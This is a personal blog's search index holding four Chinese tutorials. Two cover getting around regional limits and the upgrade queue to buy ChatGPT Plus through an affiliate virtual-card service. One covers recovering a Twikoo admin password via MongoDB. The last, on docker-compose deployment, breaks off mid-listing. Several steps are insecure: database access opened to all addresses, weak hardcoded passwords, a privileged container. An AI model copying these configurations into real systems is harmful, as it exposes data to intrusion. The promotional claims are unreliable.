<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>开启AI赚钱之旅！5分钟教你怎么注册并升级ChatGPT Plus【详细GPT注册升级流程】</title>
      <link href="/posts/upgrade-chatgpt-to-plus/"/>
      <url>/posts/upgrade-chatgpt-to-plus/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>注意，这个教程是写给<strong>已经有GPT账号</strong>的同学，如果你还没有，需要新注册，请点下面这篇:</p><p>👉<a href="https://www.zeker.top/posts/buy-chatgpt-account/">免费注册ChatGPT账号教程</a>👈</p><p>ChatGPT 官方暂停了升级 GPT-4 的入口，但目前官网还可以直接升级。请注意，这种情况可能会变化（截至2024.3月，此途径仍然可用）。</p><p>重要提示：此前流传的通过支付宝购买 <code>Apple Store 礼品卡</code>，然后在 iOS 客户端升级的方法现已不可行，因为 iOS 客户端暂停了升级服务。</p><p><strong>目前已成功，已经玩了几天了，GPT 4 的能力是真的强！！！</strong></p><h2 id="升级-Plus-的步骤"><a href="#升级-Plus-的步骤" class="headerlink" title="升级 Plus 的步骤"></a>升级 Plus 的步骤</h2><h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h3><p>如果你还没有 ChatGPT 账号，请先注册一个。</p><p>👉<a href="https://www.zeker.top/posts/buy-chatgpt-account/">免费注册ChatGPT账号教程</a>👈</p><p>目前大家普遍遇到的主要问题有两个：</p><ul><li>ChatGPT 官方入口关闭（本文方法可插队立马支付）。</li><li>缺乏国外信用卡（本文方法 <strong>2分钟</strong>开完卡）。</li></ul><blockquote><p>♥ 如果不会操作，也可以提供代充、GPT 账号注册等服务，有需要加微信：YueShiwa，备注：chatgpt</p></blockquote><h3 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2. 解决方案"></a>2. 解决方案</h3><h4 id="2-1-绕过官方入口"><a href="#2-1-绕过官方入口" class="headerlink" title="2.1 绕过官方入口"></a>2.1 绕过官方入口</h4><p>直接登录 ChatGPT 后，在同一浏览器新开一个标签页，点击以下链接即可进入升级页面：</p><p><a href="https://chat.openai.com/invite/accepted">https://chat.openai.com/invite/accepted</a></p><h4 id="2-2-获取国外信用卡"><a href="#2-2-获取国外信用卡" class="headerlink" title="2.2 获取国外信用卡"></a>2.2 获取国外信用卡</h4><p>当前我找到一个方式，全流程非常流畅，大概 <strong>2 分钟以内</strong>搞定！</p><p>（可以放心开卡、充值，目前还可以用，不能用的话，我会及时同步的）</p><p>完美解决缺乏国外信用卡银行卡的问题：</p><p><a href="https://bewildcard.com/i/GPT44">WildCard | 一分钟开卡，轻松订阅海外软件服务</a></p><p>（PS：大家可以使用我的邀请链接: <a href="https://bewildcard.com/i/GPT44">https://bewildcard.com/i/GPT44</a> ，或者邀请码：GPT44，这样你能有 88 折优惠！！！)</p><p>这家国内的公司应该是专门解决这个问题的，会使用支付宝进行实名认证，大家不用担心，这个是因为走银联通道购汇需要，不用担心安全问题~</p><p>开的卡是有效期2年的虚拟信用卡，开卡费包含两年年费，算下来100元RMB，一天2毛钱不到，其它费用无，后续自己订阅产品，用多少充多少。</p><p><strong>关键是！！随时可以提现，大家不用担心钱充进去就取不出来了，如果没消费成功，亲测可以秒提现到支付宝：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/1.png" alt=""></p><p><strong>关键是这个卡片，不仅可以用来订阅 ChatGPT，一些常见的国外付费订阅软件都可以使用，强烈推荐开一个~</strong></p><h3 id="3-升级-Chatgpt"><a href="#3-升级-Chatgpt" class="headerlink" title="3. 升级 Chatgpt"></a>3. 升级 Chatgpt</h3><p>在浏览器地址栏输入 <a href="https://chat.openai.com/">https://chat.openai.com/</a> 网址访问openai，登录自己的openai帐户后，点击左下角的 <code>Upgrade to Plus</code>，在弹窗中选择 <code>Upgrade plan</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/2.png" alt="网址输入https://chat.openai.com/"></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/3.png" alt="点击右下角升级选项"></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/4.png" alt="选择右边的Upgrade plan"></p><h4 id="3-1-升级需要排队怎么办？"><a href="#3-1-升级需要排队怎么办？" class="headerlink" title="3.1 升级需要排队怎么办？"></a>3.1 升级需要排队怎么办？</h4><p>如果是新账户，显示升级需要排队，可以在登录 gpt 之后，再访问下面这个网址，就可以绕过排队，直接升级 Plus。</p><p><a href="https://chat.openai.com/invite/accepted">https://chat.openai.com/invite/accepted</a></p><h4 id="3-2-绑定-WildCard-卡片来升级-Plus"><a href="#3-2-绑定-WildCard-卡片来升级-Plus" class="headerlink" title="3.2 绑定 WildCard 卡片来升级 Plus"></a>3.2 绑定 WildCard 卡片来升级 Plus</h4><p>这里提供两种升级方式，两种均可升级成功，可自行决定</p><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第一种方式</span></div>    <div class="hide-content"><p>开卡之后，进入主页面，点击<strong>一键升级ChatGPT</strong>。</p><p>这里千万要注意，最好不要使用outlook.com、hotmail、live.cn邮箱注册的gpt账号，否则可能有封号的风险</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/10.jpg" alt=""></p><p>如果你的账号符合要求，这可以直接点击“我的邮箱账号符合要求”，可根据需求选择个人或团队</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/11.jpg" alt=""></p><p>之后按照提示即可，5分钟即可完成升级流程！！！</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/12.jpg" alt=""></p></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第二种方式</span></div>    <div class="hide-content"><p>在弹出的 Stripe 绑卡页面，依次填入您的 WildCard 卡号、有效月份/年份、CVC（即您的 CVV ）、姓名拼音（名字拼音在前，姓氏拼音在后，中间一定要有空格）和我们提供的美国账单地址。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/5.png" alt=""></p><p>一般点击「订阅」按钮即可成功。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/6.png" alt=""></p></div></div><h4 id="3-3-绑定出现问题"><a href="#3-3-绑定出现问题" class="headerlink" title="3.3 绑定出现问题"></a>3.3 绑定出现问题</h4><p>如果出现 <code>unable to authorize/未能验证您的支付方式/card has been declined/银行卡被拒绝</code>这类错误，排除下，如果不是因为卡片余额不足，主要是因为使用的网络环境被太多人用来支付，被识别为了机器人或高风险操作导致了这个报错。</p><p>可以直接找客服协助绑定，<strong>1 分钟</strong>搞定。</p><p><strong>需要给客服发送两个内容。</strong></p><p>一个是支付页面的网址，需要您返回上一步，然后重新点击 Upgrade 进入一下 chatgpt 的付款页面，什么内容都不要填，直接把复制一下 <code>pay.openai.com</code> 开头的那个全部网址，发给客服。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/7.png" alt=""></p><p>另一个是卡片信息，点击卡片右上角的复制全部即可</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20240303/8.png" alt=""></p><p>开始去 GPT4 冲浪吧！AI赚钱之旅开启航！！！</p>]]></content>
      
      
      <categories>
          
          <category> ChatGPT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChatGPT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国内ChatGPT账号免费注册教程，无需手机验证码【2024年最新教程】</title>
      <link href="/posts/buy-chatgpt-account/"/>
      <url>/posts/buy-chatgpt-account/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，最近很多人都问到如何注册 <code>ChatGPT</code>，在这个<code>AI</code>盛行的时代，通过AI来为自己工作何尝不是一件提高自己工作效率的事呢？</p><p>但奈何<code>openAI</code>都不再允许国内的邮箱注册的，再加上注册需要国外手机号，且操作繁杂，我当时也是注册了半天才注册到一个账号。</p><div class="note info flat"><p>部分名词解释（照顾一下部分读者）：<br><code>ChatGPT</code> 是<code>OpenAI</code>发布的一款聊天机器人模型，基于GPT模型进行训练。<br>如果你有<code>OpenAI</code>账号，则可以通过内测使用他们发布的其他产品，比如<code>midjoury</code>、<code>sora</code>等等</p></div><p><strong>现在分享一个国内ChatGPT账号免费注册教程，无需手机验证码！！！</strong></p><p><strong>2024年实测有效，已经成功帮身边的朋友注册过了！！！</strong></p><h2 id="注册步骤"><a href="#注册步骤" class="headerlink" title="注册步骤"></a>注册步骤</h2><p>按下面步骤来：</p><ol><li><p>点这个链接注册：<br>👉<a href="https://bewildcard.com/i/GPT44">WildCard | 一分钟开卡，轻松订阅海外软件服务</a>👈 <br></p><blockquote><p><strong>PS：邀请码记得填上 GPT44，这样有后续信用卡支付会有 88 折优惠</strong></p></blockquote></li><li><p>注册完后，网站上有 <code>浏览器代理(科学访问openai)</code> + <code>海外手机号(注册openai需要)</code> +<br><code>海外邮箱(注册需要)</code>，这三个都有了之后，就可以很快注册 ChatGPT 账号。</p></li></ol><p>注册教程可以看网站上的帮助文档，非常详细，有不会的可以实时问客服：</p><p>👉 <a href="https://help.bewildcard.com/zh-CN/articles/8129576-openai-%E8%B4%A6%E5%8F%B7%E5%85%8D%E8%B4%B9%E6%B3%A8%E5%86%8C%E6%95%99%E7%A8%8B">OpenAI 账号免费注册教程</a>👈</p><blockquote><p>如果不会操作，也可以提供<strong>代充</strong>、<strong>GPT 账号注册</strong>等服务<br/><strong>♥有需要的可以用加微信：YueShiwa，备注：chatgpt</strong><br>欢迎各位的交流探讨！！！</p></blockquote><div class="note primary no-icon flat"><p>如果你有OpenAI账号，可以看一下 👉<a href="https://www.zeker.top/posts/upgrade-chatgpt-to-plus">2分钟升级ChatGPT Plus</a>👈</p></div>]]></content>
      
      
      <categories>
          
          <category> ChatGPT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChatGPT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Twikoo找回暗号及密码</title>
      <link href="/posts/bb3290a1/"/>
      <url>/posts/bb3290a1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>哈喽，距离上一篇文章的发布还是在上次（doge）嘻嘻，其实也就一年多而已啦（别打我错了），想想这一年经历了很多，考研、找实习、论文、毕业，还有学习…</p><p>其实不是我想鸽，我也一直在学习状态，只是因为找不到合适写的点。</p><p>加之我的<strong>网站宗旨：坚持原创，反对抄袭转载</strong>。很多文章确实很详细了，也没必要过多解读、转载，毕竟我深受其害。</p><p>好了，回到正题，今天的文章是关于<code>Twikoo</code>找回暗号及密码，别问我怎么想写这个的，刚摸索找回来的/(ㄒoㄒ)/~~</p><h1 id="自身部署说明"><a href="#自身部署说明" class="headerlink" title="自身部署说明"></a>自身部署说明</h1><p>我的<code>Twikoo</code>是通过<code>Vercel</code>部署的，以下也是针对这个情况的。</p><p>详情请前往 🔗<a href="https://twikoo.js.org/">Twikoo文档</a></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-1.5qk479lo67g0.jpg" alt="部署说明"></p><p>可以看到说明中提到了<code>MongoDB</code>和<code>Vercel</code>，我们主要是从这两方面找。</p><h1 id="修改MongoDB配置"><a href="#修改MongoDB配置" class="headerlink" title="修改MongoDB配置"></a>修改MongoDB配置</h1><p>进入<code>MongoDB Atlas</code>中，在自己创建的项目下</p><p><code>SECURITY</code> &gt; <code>Network Access</code> &gt; <code>Edit</code> &gt;  修改网络允许为所有人</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-2.jpg" alt="修改MongoDB配置"></p><h1 id="查看Vercel配置URI"><a href="#查看Vercel配置URI" class="headerlink" title="查看Vercel配置URI"></a>查看Vercel配置URI</h1><p>进入自己的<code>Vercel</code>主页页面，点击自己之前按照提示创建的项目</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-3.jpg" alt="查看Vercel配置URI-1"></p><p>进入后 <code>Settings</code> &gt; <code>Environment Variables</code>，找到自己的<code>MONGODB_URI</code>，复制<code>URI</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-4.jpg" alt="查看Vercel配置URI-2"></p><h1 id="连接MongoDB"><a href="#连接MongoDB" class="headerlink" title="连接MongoDB"></a>连接MongoDB</h1><p>连接<code>MongoDB</code>有两种方式：</p><ol><li>MongoDB Compass</li><li>MangoDB for VS Code</li></ol><h2 id="MongoDB-Compass"><a href="#MongoDB-Compass" class="headerlink" title="MongoDB Compass"></a>MongoDB Compass</h2><p>下载请前往🔗<a href="https://blog.csdn.net/GyaoG/article/details/123468294">MongoDB可视化管理工具-MongoDB Compass</a></p><p>将上面复制好的<code>URI</code>粘贴到<code>URI框</code>中，之后连接即可</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-5.jpg" alt="MongoDB Compass"></p><h2 id="MongoDB-for-VS-Code"><a href="#MongoDB-for-VS-Code" class="headerlink" title="MongoDB for VS Code"></a>MongoDB for VS Code</h2><p><code>VScode</code>的插件，直接在扩展中搜索安装即可。</p><p>按下图顺序将<code>URI</code>复制到指定框中，回车连接即可。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-6.jpg" alt="MangoDB for VS Code"></p><h1 id="查看MongoDB数据"><a href="#查看MongoDB数据" class="headerlink" title="查看MongoDB数据"></a>查看MongoDB数据</h1><p>上面任意一种方式进入<code>MongoDB</code>中，在<code>myFirstDatabase</code>下的<code>config表</code>中可以找到全部配置信息，可以自行查看修改</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-7.jpg" alt="查看MongoDB数据"></p><p>其中，<code>ADMIN_PASS</code>是评论管理的密码， <code>HIDE_ADMIN_CRYPT</code>是评论管理的暗号（显示管理入口的）</p><div class="note info flat"><p>手动删除<code>ADMIN_PASS</code>密码，重新登录twikoo就可以重新配置密码了</p></div><h1 id="课余小知识"><a href="#课余小知识" class="headerlink" title="课余小知识"></a>课余小知识</h1><p>据测试，<code>ADMIN_PASS</code>的加密方式为两层md5加密，即<code>md5(md5(password))</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-8.jpg" alt="课余小知识"></p>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
          <category> Twikoo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Vercel </tag>
            
            <tag> Twikoo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker-compose部署前后端项目</title>
      <link href="/posts/338829e1/"/>
      <url>/posts/338829e1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Docker Compose 是官方编排的项目之一，负责快速的部署分布式应用。</p><p>使用Docker Compose可以轻松、高效的管理容器，它是一个用户定义和运行多个容器的Docker应用程序。</p><p>在Docker Compose中你可以使用YAML文件来配置你的应用服务，然后只需要一个简单的命令，就可以创建并启动你配置的所有服务。</p><h2 id="实验设备及需求"><a href="#实验设备及需求" class="headerlink" title="实验设备及需求"></a>实验设备及需求</h2><ul><li><p>前后端项目一份（Vue+spring） </p></li><li><p>Ubuntu（已装docker及docker-compose）</p></li></ul><h2 id="一、文件目录总览"><a href="#一、文件目录总览" class="headerlink" title="一、文件目录总览"></a>一、文件目录总览</h2><p>目录文件夹如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/文件目录.18zcsffav83k.jpg" alt="目录总览"></p><ul><li><p>前端：nginx部署</p></li><li><p>后端：Java8环境运行jar包</p></li><li><p>数据库：mysql、redis</p></li></ul><div class="note primary no-icon flat"><p>为了让其他同学更好的理解创建过程，以后能够写出适合自己的，以下会分模块进行粗略解释，完整代码可见第六点。</p></div><h2 id="二、前端Nginx"><a href="#二、前端Nginx" class="headerlink" title="二、前端Nginx"></a>二、前端Nginx</h2><p>前端项目中ip地址改为<code>宿主机ip地址</code>，<code>npm run build</code>打包前端代码放入指定路径中</p><p><code>docker-compose.yml</code>文件中的<code>:</code>符号，前面的<code>路径/端口</code>表示宿主机的（自定义），后面的<code>路径/端口</code>表示容器的（基本不用修改）</p><p>docker-compose内前端服务</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/nginx/nginx.conf:/etc/nginx/nginx.conf</span>   <span class="comment"># nginx配置文件</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/html/dist/:/usr/share/nginx/html/</span>        <span class="comment"># 前端打包文件</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.8</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>      <span class="comment"># 这个必须要，解决nginx的文件调用的权限问题</span></span><br></pre></td></tr></table></figure><p>nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;                                                  </span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">            try_files $uri $uri/ /index.html last; # 在原来的文件中添加这句</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、数据库Mysql、Redis"><a href="#三、数据库Mysql、Redis" class="headerlink" title="三、数据库Mysql、Redis"></a>三、数据库Mysql、Redis</h2><p>docker-compose内数据库服务</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0.12</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span>                <span class="comment">#数据库初始话为root用户设置的默认密码</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=xx</span><span class="comment"># 项目数据库名</span></span><br><span class="line">      <span class="comment"># - MYSQL_USER:                           #自定义数据库的用户，权限只作用于MYSQL_DATABASE配置的数据库</span></span><br><span class="line">      <span class="comment"># - MYSQL_PASSWORD:                    #自定义数据库的用户，权限只作用于MYSQL_DATABASE配置的数据库</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/cnf/my.cnf:/etc/my.cnf</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/data:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/mysql/init/xx.sql:/docker-entrypoint-initdb.d/xx.sql</span><span class="comment"># 自己的sql文件</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span> <span class="string">--character-set-server=utf8mb4</span> <span class="string">--collation-server=utf8mb4_unicode_ci</span> <span class="string">--sql-mode=&#x27;&#x27;</span> <span class="string">--max-execution-time=1000</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_ROOT_PASSWORD=passwd</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/conf/redis.conf:/etc/redis/redis.conf</span>   <span class="comment">#挂载redis.conf不然后续重启redis密码会失效</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/data:/data</span></span><br><span class="line">      <span class="comment"># - ./config/redis/log/redis.log:/logs/redis.log</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">    <span class="comment"># privileged: true</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">/etc/redis/redis.conf</span> <span class="string">--requirepass</span> <span class="string">passwd</span>          <span class="comment">#指定配置文件启动redis</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mysql命令<code>command</code>中：</p><div class="table-container"><table><thead><tr><th style="text-align:left">命令</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:left">—default-authentication-plugin=mysql_native_password</td><td>默认的身份认证插件</td></tr><tr><td style="text-align:left">—character-set-server=utf8mb4</td><td>将MySQL数据库相关的字符集都设置为utf8mb4</td></tr><tr><td style="text-align:left">—sql-mode=’’</td><td>默认值为空，此时MySQL执行的不严格的检查</td></tr><tr><td style="text-align:left">—max-execution-time=1000</td><td>最大执行时间</td></tr></tbody></table></div><p>👉项目中没有配置redis的可以跳过了。</p><p>Redis配置文件<code>redis.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span 